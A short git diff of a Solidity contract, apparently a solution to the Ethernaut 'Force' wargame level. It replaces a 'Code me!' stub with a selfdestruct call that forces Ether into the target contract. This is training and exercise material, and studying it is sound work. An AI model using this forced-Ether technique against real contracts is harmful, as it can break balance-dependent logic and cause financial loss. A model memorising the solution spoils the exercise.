@@ -3,13 +3,16 @@ pragma solidity ^0.8.9;
 import "./Force.sol";
 
 contract AttackingForce {
-    address public contractAddress;
+    Force public force;
 
-    constructor(address _contractAddress) payable {
-        contractAddress = _contractAddress;
+    constructor(address _force) payable {
+        force = Force(_force);
     }
 
     function hackContract() external {
-        // Code me!
+        
+        // cast address to payable
+        address payable addr = payable(address(force));
+        selfdestruct(addr);
     }
 }
